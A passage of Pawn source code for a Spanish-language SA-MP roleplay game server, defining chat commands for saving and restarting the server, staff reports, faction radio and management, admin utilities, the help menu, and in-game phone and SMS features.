CMD:exit(playerid, params[]) {
	new
		Float:x,
		Float:y,
		Float:z,
		Float:a;

	foreach(new i : Player) {
  		DisablePlayerCheckpoint(i);
		SetPlayerCameraPos(i,1460.0, -1324.0, 287.2);
		SetPlayerCameraLookAt(i,1374.5, -1291.1, 239.0, 1);
        GetPlayerPos(i,x,y,z);
        GetPlayerFacingAngle(i, a);
	    PlayerInfo[i][pX] = x;
		PlayerInfo[i][pY] = y;
		PlayerInfo[i][pZ] = z;
		PlayerInfo[i][pInterior] = GetPlayerInterior(i);
		PlayerInfo[i][pVirtualWorld] = GetPlayerVirtualWorld(i);
		PlayerInfo[i][pA] = a;
		SaveAccount(i);
		gPlayerLogged[i] = 0;
	}
	SaveServerInfo();
 	SaveFactions();
	SaveVehicles();
	SaveHouses();
	SaveAllBusiness();
	saveBuildings();
	iGMXTick = 11;
	timersID[9] = SetTimerEx("restartTimer", 1000, true, "i", 1);
	return 1;
}

CMD:tod(playerid, params[]) {

	if(isnull(params))
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /tod [hora del d�a] (0-23)");

	new
		tod = strval(params);

	if(tod <= 23 && tod >= 0) {
		SetWorldTime(tod);
	} else {
		SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} la hora debe ser mayor a 0 y menor a 23.");
	}
	
	return 1;
}

/*CMD:noguardar(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] != 20) return 1;
	if(dontsave) {
	    dontsave = false;
	}
	else {
		dontsave = true;
	}
	return 1;
}*/

CMD:payday(playerid, params[]) {
	PayDay(playerid);
	return 1;
}

CMD:verjail(playerid, params[])
{
	new targetid;

    if(sscanf(params, "u", targetid))
    	return SendClientMessage(playerid, COLOR_GRAD2, "{5CCAF1}[Sintaxis]:{C8C8C8} /verjail [ID/Jugador]");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
	if(PlayerInfo[targetid][pJailed] == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El usuario no tiene ninguna condena.");

	if(PlayerInfo[targetid][pJailed] == 1) {
    	SendFMessage(playerid, COLOR_YELLOW2, "{FF4600}[IC]:{C8C8C8} %d segundos.", PlayerInfo[targetid][pJailTime]);
	} else {
	    SendFMessage(playerid, COLOR_YELLOW2, "{FF4600}[OOC]:{C8C8C8} %d segundos.", PlayerInfo[targetid][pJailTime]);
	}
    return 1;
}

CMD:resetabstinencia(playerid, params[])
{
	new targetid, string[128];

    if(sscanf(params, "u", targetid))
    	return SendClientMessage(playerid, COLOR_GRAD2, "{5CCAF1}[Sintaxis]:{C8C8C8} /resetabstinencia [ID/Jugador]");
    if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");

    PlayerInfo[targetid][pAdictionPercent] = 0.0;
    PlayerInfo[targetid][pAdictionAbstinence] = 0;
    
    format(string, sizeof(string), "El administrador %s te ha reseteado la abstinencia.", GetPlayerNameEx(playerid));
	SendClientMessage(targetid, COLOR_WHITE, string);
	format(string, sizeof(string), "El administrador %s le ha reseteado la abstinencia a %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(targetid));
    AdministratorMessage(COLOR_ADMINCMD, string, 1);
	format(string, sizeof(string), "[ABSTINENCE] Reset abstinence a %s (DBID: %d)", GetPlayerNameEx(targetid), PlayerInfo[targetid][pID]);
	log(playerid, LOG_ADMIN, string);
    return 1;
}

//====================COMANDOS DE COMUNICACION CON STAFF========================

CMD:duda(playerid,params[]) {
	new string[128], string2[128];
	if(sscanf(params, "s[128]", string)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /duda [texto]");
	else
	{
	    format(string2,sizeof(string2),"[Duda] (%d) %s: %s",playerid,GetPlayerNameEx(playerid),string);
        AdministratorMessage(COLOR_ADMINQUESTION, string2, 1);
        SendClientMessage(playerid,COLOR_RED,"La duda ha sido enviada, por favor sea paciente.");
	}
	return 1;
}

CMD:reportar(playerid,params[])
{
	new id, string[128], reporttext[128];
	if(sscanf(params,"us[128]", id, reporttext)) SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /reportar [ID/ParteDelNombre] [raz�n]");
	else
	{
		if(id != INVALID_PLAYER_ID)
	    {
			format(string, sizeof(string), "[Reporte]: %s ha reportado a %s (ID:%d), raz�n: %s", GetPlayerNameEx(playerid), GetPlayerNameEx(id), id, reporttext);
			AdministratorMessage(COLOR_ADMINCMD, string, 1);
			format(string, sizeof(string), "Has reportado a %s (ID:%d), raz�n: %s", GetPlayerNameEx(id), id, reporttext);
			SendClientMessage(playerid, COLOR_WHITE, string);
			ReportLog(string);
		}
		else
		{
		  	SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FF4600}[Error]:{C8C8C8} nombre incorrecto o el jugador no se encuentra conectado.");
		}
	}
	return 1;
}

//===========================COMANDOS DE FACCIONES==============================

CMD:r(playerid, params[]) {
	cmd_radio(playerid, params);
	return 1;
}

CMD:radio(playerid, params[])
{
	new text[128], string[128], factionID = PlayerInfo[playerid][pFaction];

	if(factionID == 0)
	    return 1;
	if(sscanf(params, "s[128]", text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/r)adio [mensaje]");
	if(PlayerInfo[playerid][pRadio] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes una radio, v� y compra una en alg�n 24-7.");
	if(!RadioEnabled[playerid])
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes tu radio apagada.");
	if(Muted[playerid])
		return SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} no puedes usar la radio, te encuentras silenciado.");

	PlayerActionMessage(playerid, 15.0, "toma una radio de su bolsillo y habla por ella.");
	if(!usingMask[playerid])
		format(string, sizeof(string), "%s dice por radio: %s", GetPlayerNameEx(playerid), text);
	else
	    format(string, sizeof(string), "Enmascarado %d dice por radio: %s", maskNumber[playerid], text);
	ProxDetector(15.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5, 0);
	format(string, sizeof(string), "[RADIO]: %s %s: %s", GetRankName(factionID, PlayerInfo[playerid][pRank]), GetPlayerNameEx(playerid), text);
	foreach(new i : Player)
	{
 		if(PlayerInfo[i][pFaction] == factionID && RadioEnabled[i] && PlayerInfo[i][pRadio] != 0)
   			SendClientMessage(i, COLOR_PMA, string);
	}
	FactionChatLog(string);
	return 1;
}

CMD:fac(playerid, params[]) {
	cmd_faccion(playerid, params);
	return 1;
}

CMD:faccion(playerid, params[])
{
	new text[128], param[64], param2[64], string[128], factionid;

	factionid = PlayerInfo[playerid][pFaction];
	if(factionid <= 0)
		return 1;
	if(sscanf(params, "s[128]S()[64]S()[64]", text, param, param2)) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/fac)cion [comando]");
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Comandos: abandonar | conectados");
		if(FactionInfo[factionid][fType] == FAC_TYPE_ILLEGAL)
		    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Comandos extra: materiales");
		if(PlayerInfo[playerid][pRank] == 1) {
		    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Comandos de l�der: invitar | expulsar | rango | vehiculos");
            SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Recuerda que al ser el lider puedes estacionar los veh�culos, y gestionar la cuenta bancaria de la facci�n.");
		}
		    
	} else if(strcmp(text,"abandonar",true) == 0) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "�Has abandonado tu facci�n!");
		SetPlayerFaction(playerid, 0, 0);
		
	} else if(strcmp(text,"materiales",true) == 0) {
	    if(FactionInfo[factionid][fType] == FAC_TYPE_ILLEGAL)
			SendFMessage(playerid, COLOR_WHITE, "Tu HQ cuenta con %d piezas de armas.", FactionInfo[factionid][fMaterials]);

	} else if(strcmp(text,"conectados",true) == 0) {
	    SendFMessage(playerid, COLOR_LIGHTYELLOW2, "Miembros conectados [%s]:", FactionInfo[factionid][fName]);
	    foreach(new i : Player) {
	        if(PlayerInfo[i][pFaction] == factionid)
				SendFMessage(playerid, COLOR_WHITE, "* (%s) %s", GetRankName(factionid, PlayerInfo[i][pRank]), GetPlayerNameEx(i));
	    }
	    
	} else if(strcmp(text,"invitar",true) == 0) {
	    new targetid = ReturnUser(param);
		if(PlayerInfo[playerid][pRank] != 1)
			return 1;
		if(!strlen(param))
			return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/fac)cion invitar [ID/Jugador]");
		if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID || !gPlayerLogged[targetid])
		    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID incorrecta o personaje no conectado.");
		if(PlayerInfo[targetid][pFaction] != 0)
		    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} el personaje ya tiene una facci�n.");
        if(FactionInfo[factionid][fJoinRank] == 0)
            return SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FF4600}[Error]:{C8C8C8} por favor configura el rango de ingreso/cantidad de rangos antes de continuar.");

		FactionRequest[targetid] = factionid;
		SendFMessage(targetid, COLOR_LIGHTBLUE, "Has sido invitado a la facci�n %s por %s. (/aceptar faccion - para ingresar).",FactionInfo[factionid][fName],GetPlayerNameEx(playerid));
		SendFMessage(playerid, COLOR_LIGHTBLUE, "Has invitado a %s a la facci�n %s.",GetPlayerNameEx(targetid),FactionInfo[factionid][fName]);
		return 1;
		
	} else if(strcmp(text,"expulsar",true) == 0) {
	    new targetid = ReturnUser(param);
		if(PlayerInfo[playerid][pRank] != 1)
			return 1;
		if(!strlen(param))
			return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/fac)cion expulsar [playerid/ParteDelNombre]");
		if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID || !gPlayerLogged[targetid])
		    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID incorrecta o personaje no conectado.");
		if(PlayerInfo[targetid][pFaction] != PlayerInfo[playerid][pFaction])
		    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} el personaje no pertenece a tu facci�n.");

		SetPlayerFaction(targetid, 0, 0);
		SendFMessage(targetid, COLOR_LIGHTBLUE, "Has sido expulsado de la facci�n %s por %s.", FactionInfo[factionid][fName], GetPlayerNameEx(playerid));
		SendFMessage(playerid, COLOR_LIGHTBLUE, "Has expulsado a %s de la facci�n %s.", GetPlayerNameEx(targetid), FactionInfo[factionid][fName]);
		return 1;
		
	} else if(strcmp(text,"rango",true) == 0) {
		new targetid = ReturnUser(param), rank = strval(param2);
		if(PlayerInfo[playerid][pRank] != 1)
			return 1;
		if(!strlen(param) || !strlen(param2))
			return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/fac)cion rango [playerid/ParteDelNombre] [rango]");
		if(PlayerInfo[targetid][pFaction] != factionid)
			return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} el personaje no pertenece a tu facci�n.");
		if(rank < 2 || rank > FactionInfo[factionid][fRankAmount]) {
			SendFMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} el rango no debe ser menor a 2 o mayor que %d.", FactionInfo[factionid][fRankAmount]);
			return 1;
		}
		if(!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID || !gPlayerLogged[targetid])
		    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID incorrecta o personaje no conectado.");

		SetPlayerFaction(targetid, factionid, rank);
		SendFMessage(targetid, COLOR_LIGHTBLUE, "{878EE7}[INFO]:{C8C8C8} tu rango ha sido cambiado por %s, ahora eres %s.", GetPlayerNameEx(playerid), GetRankName(factionid, rank));
		SendFMessage(playerid, COLOR_YELLOW, "{878EE7}[INFO]:{C8C8C8} le has cambiado el rango de %s a %s.", GetPlayerNameEx(targetid), GetRankName(factionid, rank));
		format(string, sizeof(string), "[Facci�n]: %s es ahora %s.", GetPlayerNameEx(targetid), GetRankName(factionid, rank));
		SendFactionMessage(PlayerInfo[playerid][pFaction], COLOR_FACTIONCHAT, string);
		return 1;
		
	} else if(strcmp(text,"vehiculos",true) == 0) {
		if(PlayerInfo[playerid][pRank] != 1)
			return 1;
			
   		SendFMessage(playerid, COLOR_YELLOW, "===============|Vehiculos de facci�n: %s|===============", FactionInfo[factionid][fName]);
		for(new i=0; i<MAX_VEH; i++)
		{
		    if(VehicleInfo[i][VehFaction] == factionid)
		        SendFMessage(playerid, COLOR_ADMINCMD, "{878EE7}[INFO]:{C8C8C8} Vehiculo ID %d - Modelo %s", i, GetVehicleName(i));
		}
		SendClientMessage(playerid, COLOR_YELLOW, "====================================================================");
	}
	return 1;
}

CMD:g(playerid, params[]) {
	cmd_gritar(playerid, params);
	return 1;
}

CMD:gritar(playerid, params[]) {
	new
		text[128],
		string[128];

	if(sscanf(params, "s[128]", text)) {
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/g)ritar [texto]");
	} else {
		if(!usingMask[playerid])
			format(string, sizeof(string), "%s grita: ��%s!!", GetPlayerNameEx(playerid), text);
		else
		    format(string, sizeof(string), "Enmascarado %d grita: ��%s!!", maskNumber[playerid], text);
		ProxDetector(35.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	}
	return 1;
}

CMD:verf(playerid, params[]) {
	if(GetPVarInt(playerid, "fac") == 0) {
		SetPVarInt(playerid, "fac", 1);
		SendClientMessage(playerid, COLOR_WHITE, "Lector de faccion activado.");
		return 1;
	}
	if(GetPVarInt(playerid, "fac") == 1) {
		SetPVarInt(playerid, "fac", 0);
		SendClientMessage(playerid, COLOR_WHITE, "Lector de faccion desactivado.");
		return 1;
	}
	return 1;
}

CMD:f(playerid, params[])
{
	new text[128], string[128], faction = PlayerInfo[playerid][pFaction], rank = PlayerInfo[playerid][pRank];

	if(sscanf(params, "s[128]", text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /f [texto]");
	if(Muted[playerid])
		return SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} te encuentras silenciado.");
	if(PlayerInfo[playerid][pFaction] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "No perteneces a ninguna facci�n.");
	if(!FactionEnabled[playerid])
        return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes desactivado el chat OOC de la facci�n.");

	format(string, sizeof(string), "(( [%s] %s %s(%d): %s ))", FactionInfo[faction][fName], GetRankName(faction, rank), GetPlayerNameEx(playerid), playerid, text);
	foreach(new i : Player)
	{
 		if(PlayerInfo[i][pFaction] == faction && FactionEnabled[i])
   			SendClientMessage(i, COLOR_FACTIONCHAT, string);
		else // Para no spamear al admin con 2 veces el mismo mensaje
		{
			if(GetPVarInt(i, "fac") == 1)
				SendClientMessage(i, COLOR_GREEN, string);
		}
	}
	FactionChatLog(string);
	return 1;
}

CMD:checkinv(playerid, params[])
{
	new targetID;
	
	if(sscanf(params, "u", targetID))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /checkinv [ID/Jugador]");
	if(targetID == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID de jugador incorrecta.");

	SendFMessage(playerid, COLOR_WHITE, "Usuario: %s (%d) - DBID: %d", GetPlayerNameEx(targetID), targetID, PlayerInfo[targetID][pID]);
	PrintHandsForPlayer(targetID, playerid);
	PrintInvForPlayer(targetID, playerid);
	ShowPocket(playerid, targetID);
	PrintToysForPlayer(targetID, playerid);
	PrintBackForPlayer(targetID, playerid);
	return 1;
}

CMD:slap(playerid, params[]) {
	new
	    Float:pos[3],
	    Float:hp,
		target;
		
	if(sscanf(params, "u", target)) {
	    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /slap [IDJugador/ParteDelNombre]");
	} else if(target != INVALID_PLAYER_ID) {
		GetPlayerHealthEx(target, hp);
		SetPlayerHealthEx(target, hp - 5);
		GetPlayerPos(target, pos[0], pos[1], pos[2]);
		SetPlayerPos(target, pos[0], pos[1], pos[2] + 5);
		PlayerPlaySound(target, 1130, pos[0], pos[1], pos[2] + 5);
	}
	return 1;
}

CMD:muteb(playerid, params[])
{
	new string[128],
 		minutes,
		target;

	if(sscanf(params, "ui", target, minutes))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /muteb [IDJugador/ParteDelNombre] [minutos]");

	if(target != INVALID_PLAYER_ID)
	{
	    if(minutes > 30 || minutes < 0)
			return SendClientMessage(playerid, COLOR_YELLOW2, "No puedes mutear por menos de 0 minutos o m�s de 30.");
			
	    format(string, sizeof(string), "[Staff] el administrador %s ha muteado el canal '/b' de %s por %d minutos.", GetPlayerNameEx(playerid), GetPlayerNameEx(target), minutes);
	   	AdministratorMessage(COLOR_ADMINCMD, string, 1);
		PlayerInfo[target][pMuteB] = 60 * minutes;
	}
	return 1;
}

CMD:fly(playerid, params[])
{
	new Float:fAngle,
	    Float:height,
	    Float:pos[3],
	    Float:dist;

	if(sscanf(params, "ff", dist, height))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /fly [distancia] [altura]");

	GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    GetPlayerFacingAngle(playerid, fAngle);
	pos[0] += dist * floatcos(fAngle - 270);
	pos[1] += dist * floatsin(fAngle - 270);
	SetPlayerPos(playerid, pos[0], pos[1], pos[2] + height);
	PlayerPlaySound(playerid, 1130, pos[0], pos[1], pos[2] + height);
	return 1;
}

CMD:jetx(playerid,params[])
{
    SetPlayerSpecialAction(playerid,2);
    return 1;
}

CMD:ayuda(playerid,params[])
{
    SendClientMessage(playerid, COLOR_YELLOW, " ");
    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Administraci�n]:{C8C8C8} /reportar /duda");
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[General]:{C8C8C8} /stats /hora (/anim)aciones /dar /dari /mano /comprar (/cla)sificado /pagar /admins /toy /dado /moneda");
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[General]:{C8C8C8} /mostrardoc /bidon /mostrarlic /mostrarced (/inv)entario (/bol)sillo (/esp)alda /llenar /changepass");
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[General]:{C8C8C8} /yo /donar /dardroga /consumir /desafiarpicada /comprarmascara /mascara /saludar /examinar /tomarobjeto");
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Chat]:{C8C8C8} /mp /vb /local (/g)ritar /susurrar /me /do /cme /gooc /toggle /animhablar");
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Tel�fono]:{C8C8C8} /llamar /servicios /atender /colgar /sms /numero /telefono");
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Propiedades]:{C8C8C8} /ayudacasa /ayudanegocio /ayudabanco /ayudacajero");
	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Veh�culo]:{C8C8C8} /motor (/veh)iculo (/mal)etero (/cas)co /emisora /sacar /ventanillas /llavero /lojack");
    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Veh�culo]:{C8C8C8} (/cint)uron (/vercint)uron /carreraayuda");

    if(PlayerInfo[playerid][pFaction] != 0)
	{
    	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Facci�n]:{C8C8C8} /f /faccion /fdepositar");
		if(PlayerInfo[playerid][pFaction] == FAC_PMA) {
		    SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[PMA]:{C8C8C8} /ayudap /gobierno /departamento");

		} else if(PlayerInfo[playerid][pFaction] == FAC_SIDE) {
 	   		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[S.I.D.E.]:{C8C8C8} /sservicio /schaleco /sequipo /sropero /esposar /quitaresposas /revisar /tomartazer /quitar");
			SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[S.I.D.E.]:{C8C8C8} /guardartazer /arrastrar (/ref)uerzos /vercargos /buscados (/r)adio (/d)epartamento /porton");
            if(PlayerInfo[playerid][pRank] <= 3)
        		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/verregistros /comprarinsumos /guardarinsumos");
			if(PlayerInfo[playerid][pRank] == 1) {
		    	SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[L�der]:{C8C8C8} /stars");
			}

		} else if(PlayerInfo[playerid][pFaction] == FAC_HOSP) {
		    SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[HMA]:{C8C8C8} /mservicio /gobierno /departamento /ultimallamada /curar /rehabilitar");

		} else if(PlayerInfo[playerid][pFaction] == FAC_MECH) {
			SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[Taller Mercury]:{C8C8C8} /ayudamec");

		} else if(PlayerInfo[playerid][pFaction] == FAC_MAN) {
			SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[CTR-MAN]:{C8C8C8} /noticia /entrevistar");

		} else if(FactionInfo[PlayerInfo[playerid][pFaction]][fType] == FAC_TYPE_GANG) {
			if(PlayerInfo[playerid][pRank] == 1) {
		        SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[L�der]:{C8C8C8} /tomarbarrio");
		    }

		} else if(FactionInfo[PlayerInfo[playerid][pFaction]][fType] == FAC_TYPE_ILLEGAL) {
		    if(PlayerInfo[playerid][pRank] == 1) {
		        SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[L�der]:{C8C8C8} /comprarmateriales (en el shop de materiales) /guardarmateriales /ensamblar (dentro del HQ) /ch /it /ru");
		    } else {
		        SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FFDD00}[Miembro]:{C8C8C8} /comprarmateriales (en el shop de materiales) /descargarmateriales /ch /it /ru");
		    }
		}
	}

	if(PlayerInfo[playerid][pJob] == JOB_FELON) {
        SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[Delincuente]:{C8C8C8} /delincuenteayuda /dejarempleo");
	} else if(PlayerInfo[playerid][pJob] == JOB_DRUGD) {
        SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[Narcotraficante]:{C8C8C8} /comenzar /comprar /dardroga /dejarempleo");
	} else {
		SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FFDD00}[Empleo]:{C8C8C8} /tomarempleo /dejarempleo /trabajar /terminar");
	}
	return 1;
}

CMD:hora(playerid, params[])
{
	new mText[32],
	    string[128],
	    time[3],
		date[3];

	gettime(time[0], time[1], time[2]);
	getdate(date[0], date[1], date[2]);

	switch(date[1]) {
		case 1:	mText = "Enero";
		case 2:	mText = "Febrero";
		case 3:	mText = "Marzo";
		case 4:	mText = "Abril";
		case 5:	mText = "Mayo";
		case 6:	mText = "Junio";
		case 7:	mText = "Julio";
		case 8:	mText = "Agosto";
		case 9:	mText = "Septiembre";
		case 10: mText = "Octubre";
		case 11: mText = "Noviembre";
		case 12: mText = "Diciembre";
	}

	PlayerActionMessage(playerid, 15.0, "toma su reloj y se fija la hora.");
	
	if(time[1] < 10)
		format(string, sizeof(string), "La hora actual es %d:0%d:%d del d�a %d de %s del %d. {5CACC8}Pr�ximo D�a de Pago en %d minutos.", time[0], time[1], time[2], date[2], mText, date[0], 60 - (GetPVarInt(playerid, "pPayTime") / 60));
	else
		format(string, sizeof(string), "La hora actual es %d:%d:%d del d�a %d de %s del %d. {5CACC8}Pr�ximo D�a de Pago en %d minutos.", time[0], time[1], time[2], date[2], mText, date[0], 60 - (GetPVarInt(playerid, "pPayTime") / 60));

	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:servicios(playerid, params[]) {
    SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"Emergencias: 911 | Taller mec�nico: 555 | Taxi: 444 | Radio CTR-MAN: sms al 3900");
    return 1;
}

CMD:telefono(playerid,params[])
{
    
    if(PlayerInfo[playerid][pPhoneNumber] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes un tel�fono celular! consigue uno en un 24/7.");
	if(PhoneHand[playerid] == 0)
	{
	    if(GetHandItem(playerid, HAND_RIGHT) != 0)
		    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes tener la mano derecha libre.");
	        
		PlayerActionMessage(playerid, 15.0, "toma su tel�fono celular del bolsillo.");
		SendClientMessage(playerid,-1,"Para guardar tu telefono pon nuevamente /telefono");
	    PhoneHand[playerid] = 1;	
	    SetHandItemAndParam(playerid, HAND_RIGHT, ITEM_ID_TELEFONO_CELULAR, 1);
	}
	else
	{
	    PlayerActionMessage(playerid, 15.0, "guarda su tel�fono celular en el bolsillo.");
	    PhoneHand[playerid] = 0;
	    SetHandItemAndParam(playerid, HAND_RIGHT, 0, 0);
	}
	return 1;
}

CMD:atender(playerid, params[])
{
	if(Mobile[playerid] != 255)
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ya te encuentras en una llamada, /colgar para colgar.");
	if(PhoneHand[playerid] == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes tu celular en la mano.");
	if(CheckMissionEvent(playerid, 1))
	    return 1;

	foreach(new i : Player)
	{
		if(Mobile[i] == playerid)
		{
			Mobile[playerid] = i;
			SendClientMessage(i, COLOR_YELLOW2, "Han atendido tu llamada...");
			if(!IsPlayerInAnyVehicle(playerid))
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			PlayerActionMessage(playerid, 15.0, "ha atendido a un llamado telef�nico.");
		}
	}
	return 1;
}

CMD:sms(playerid, params[])
	return cmd_msg(playerid, params);

CMD:msg(playerid, params[])
{
	new phonenumber, string[128], text[128], contact;

	if(sscanf(params, "ds[128]", phonenumber, text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /msg [n�mero telef�nico] [texto]");
	if(PlayerInfo[playerid][pPhoneNumber] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes un tel�fono celular! consigue uno en un 24/7.");
	if(PhoneHand[playerid] == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes tu celular en la mano.");
	if(!PhoneEnabled[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes el tel�fono apagado. Utiliza '/toggle telefono' para encenderlo.");
	if(GetPlayerCash(playerid) < PRICE_TEXT)
		return SendClientMessage(playerid, COLOR_YELLOW2, "El mensaje no ha podido ser enviado (puede que no tengas dinero o que el jugador no se encuentre conectado).");
	if(phonenumber == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "N�mero inv�lido.");

	PlayerActionMessage(playerid, 15.0, "toma su tel�fono celular y comienza a escribir un mensaje.");
	
	if(phonenumber == 3900)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Telefonista: gracias por comunicarte con CTR-MAN, tu mensaje ser� recibido.");
		format(string, sizeof(string), "[SMS a la radio del %d]: %s", PlayerInfo[playerid][pPhoneNumber], text);
		SendFactionMessage(FAC_MAN, COLOR_WHITE, string);
		return 1;
	}
	
	foreach(new i : Player)
	{
		if(PlayerInfo[i][pPhoneNumber] == phonenumber)
		{
  			if(!PhoneEnabled[i])
		    	return SendClientMessage(playerid, COLOR_YELLOW2, "El tel�fono al que quieres contactar no se encuentra en servicio.");

			SendClientMessage(playerid, COLOR_YELLOW2, "Mensaje de texto enviado.");
			
		   	contact = IsNumberInNotebook(playerid, phonenumber);
			if(contact != -1)
				SendFMessage(playerid, COLOR_LIGHTGREEN, "SMS para %s: %s", GetNotebookContactName(playerid, contact), text);
            else
				SendFMessage(playerid, COLOR_LIGHTGREEN, "SMS para %d: %s", PlayerInfo[i][pPhoneNumber], text);

			contact = IsNumberInNotebook(i, PlayerInfo[playerid][pPhoneNumber]);
			if(contact != -1)
				SendFMessage(i, COLOR_LIGHTGREEN, "SMS de %s: %s", GetNotebookContactName(i, contact), text);
			else
			    SendFMessage(i, COLOR_LIGHTGREEN, "SMS de %d: %s", PlayerInfo[playerid][pPhoneNumber], text);
			    
			PhoneAnimation(playerid);
			SMSLog(string);
			GivePlayerCash(playerid, -PRICE_TEXT);
			Business[PlayerInfo[playerid][pPhoneC]][bTill] += PRICE_TEXT;
			return 1;
		}
	}
	return 1;
}

